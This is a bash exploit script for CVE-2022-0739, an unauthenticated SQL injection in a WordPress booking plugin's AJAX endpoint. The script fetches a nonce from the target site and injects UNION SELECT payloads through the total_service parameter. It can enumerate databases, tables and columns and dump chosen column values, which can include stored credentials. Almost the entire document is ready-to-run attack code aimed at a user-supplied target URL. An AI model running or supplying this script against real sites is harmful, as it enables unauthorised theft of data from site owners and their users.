#!/bin/bash

# CVE-2022-0739
# -------------
# Description: SQL injection via bookingpress_front_get_category_services AJAX action (unauthenticated users)
#
# Author: Marss
# Date: 08 Nov, 2022


# Ctrl + c
# (function)
signal_handler(){
  echo -e "\n[!] User terminated."
  tput cnorm; exit 1 # return cursor and exit
}

# (signal)
trap signal_handler SIGINT


## Functions
# Display help panel
help_panel(){
  echo -e "\nCVE-2022-0739"
  echo -e "-------------"
  echo
  echo -e "[*] Use: $0 -u target_url -d database -t table -c column"
  echo
}

# extract nonce of target url
extract_nonce(){
  echo $(curl -si "$target_url/events/" | grep -oP -m 1 "_wpnonce:'(.*?)'" | awk -F':' '{print $2}' | tr -d "'\n")
}

# query modes
get_databases(){
  echo "-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata-- -"
}

get_tables_len(){
  tables_data="-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema$2-- -"

  output=$(make_injection $1 "$tables_data")
  tables_len=$(echo $output | awk -F',' '{print NF}' | tr -d '\n')
  
  echo $tables_len
}
get_tables(){
  echo "-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema$1 group by table_name ASC limit 0,$2-- -"
}

get_table_number(){
  table_number=$(echo $2 | tr ' ' '\n' | grep -n $1 | awk -F ':' '{print $1}' | tr -d '\n')
  echo $table_number
}
get_columns(){
  echo "1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_schema$1 group by table_name ASC limit $2,1-- -"
}

get_values(){
  echo "-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, $1, 0x7c) from $2.$3-- -"
}

# select injection type
get_injection_type(){
  if [[ $database == "blog" ]]
  then
    database_name="=database()"
  else
    database_name="!=database()"
  fi

  if [[ $target_url && ! $database && ! $table && ! $column ]]
  then
    get_databases

  elif [[ $target_url && $database && $table && $column ]]
  then
    get_values $column $database $table

  elif [[ $target_url && $database && $table ]]
  then 
    tables_len=$(get_tables_len $user_nonce $database_name)
    tables_injection=$(get_tables $database_name $tables_len)
    tables_output=$(make_injection $user_nonce "$tables_injection")

    table_number=$(get_table_number $table "$tables_output")

    output=$(get_columns $database_name $table_number)
    echo $output 

  elif [[ $target_url && $database ]]
  then  
    tables_len=$(get_tables_len $user_nonce $database_name)

    get_tables $database_name $tables_len
  fi
}

# insert sql injection
make_injection(){
  user_nonce=$1
  payload_injection=$2
  
  echo $(curl -s "$target_url/wp-admin/admin-ajax.php" \
  --data "action=bookingpress_front_get_category_services&_wpnonce=$user_nonce&category_id=1&total_service=$payload_injection" \
  | grep -oP "\"\|(.*?)\|\"")
}

# start sql injection attack
start_attack(){

  user_nonce=$(extract_nonce)

  payload_injection=$(get_injection_type)

  output=$(make_injection $user_nonce "$payload_injection")
  echo
  echo $output | tr ',' ' ' | tr ' ' '\n' | tr -d '"'
  echo
}

## Main flow
# No arguments
if [ "$#" -eq 0 ]
then
  help_panel
  exit 1
fi

tput civis # hide cursor

# Valid options
while getopts ":hu:d:t:c:" option
do
  case $option in
    h) # display help panel
      help_panel 
      tput cnorm; exit;;
    u) # save target url
      target_url=$OPTARG;;
    d) # save database name
      database=$OPTARG;;
    t) # save table name
      table=$OPTARG;;
    c) # save column name
      column=$OPTARG;;
    \?) # invalid option
      echo -e "\n[x] Error: Invalid option."
      tput cnorm; exit;;
  esac
done; tput cnorm # return cursor

# insert injection to target url
start_attack
